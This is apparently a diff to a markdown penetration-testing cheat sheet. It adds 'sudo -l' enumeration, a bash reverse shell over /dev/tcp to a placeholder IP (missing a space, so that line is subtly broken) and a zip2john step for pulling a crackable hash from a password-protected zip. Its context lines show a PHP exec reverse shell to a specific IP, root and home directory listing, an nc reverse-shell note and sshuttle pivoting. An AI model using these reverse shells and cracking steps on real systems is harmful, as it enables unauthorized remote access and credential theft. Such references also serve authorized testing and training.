@@ -78,6 +78,10 @@
 
 `id`
 
+### Show Users Sudo Permissions
+
+`sudo -l`
+
 ### List All Users Home Directories
 
 `ls -ahlR /root/; ls -ahlR /home/`
@@ -169,6 +173,10 @@ _or_
 exec("/bin/bash -c 'bash -i > /dev/tcp/172.30.10.210/443 0>&1'");
 ```
 
+### Bash Reverse Shell
+
+`bash-c'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'`
+
 <!--
 ##################################################################
 ##################################################################
@@ -217,3 +225,7 @@ run nc on port 8084, and if 10.1.1.230:8083 receives a reverse shell, you will g
 ### sshuttle
 
 `sshuttle --dns -vvr user@targetip -x targetip 0/0`
+
+### Pull Hash from Password Protected Zip
+
+`zip2john file.zip > hash`
